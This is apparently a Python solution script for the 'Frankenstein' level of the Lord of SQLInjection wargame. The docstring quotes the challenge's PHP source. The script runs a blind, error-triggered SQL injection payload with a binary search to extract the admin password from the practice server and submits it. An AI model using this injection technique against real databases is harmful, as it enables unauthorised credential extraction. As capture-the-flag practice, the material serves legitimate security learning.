#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'config' in args[0]


def main():
    """
    Frankenstein 28

    if(preg_match('/prob|_|\.|\(|\)|union/i', $_GET[pw])) exit("No Hack ~_~");
      $query = "select id,pw from prob_frankenstein where id='frankenstein' and pw='{$_GET[pw]}'";
      echo "<hr>query : <strong>{$query}</strong><hr><br>";
      $result = @mysqli_fetch_array(mysqli_query($db,$query));
      if(mysqli_error($db)) exit("error");

      $_GET[pw] = addslashes($_GET[pw]);
      $query = "select pw from prob_frankenstein where id='admin' and pw='{$_GET[pw]}'";
      $result = @mysqli_fetch_array(mysqli_query($db,$query));
      if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("frankenstein");
    """

    url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    other_param = {'id': 'admin'}

    b = 0xffffffffffffffffffff
    ''' 
    a = 0
    while b - a != 0:
        center = hex(a + (b - a) // 2 + 1)
        if len(center) % 2 != 0:
            center = "0x0" + center[2:]
        p.payload = f"'||id='admin' and case when pw<{center} then 1 else 9e307*2 end#"
        response = p.my_request()
        if check_func(response):
            b = int(center, 0) - 1
        else:
            a = int(center, 0)
    result = bytearray.fromhex(hex(a)[2:]).decode().lower().strip()
    '''
    payload = f"'||id='admin' and case when pw<%s then 1 else 9e307*2 end#"
    p = los.SqlInjection(url, cook, method, inj_param, payload,
                         other_param=other_param)
    result = p.one_binary(check_func, left=0x0, right=b, mode='hex')

    p.payload = bytearray.fromhex(hex(result)[2:]).decode().lower().strip()
    response = p.my_request()
    if 'Clear!' in response:
        print('\nFrankenstein Clear!')


if __name__ == '__main__':
    main()
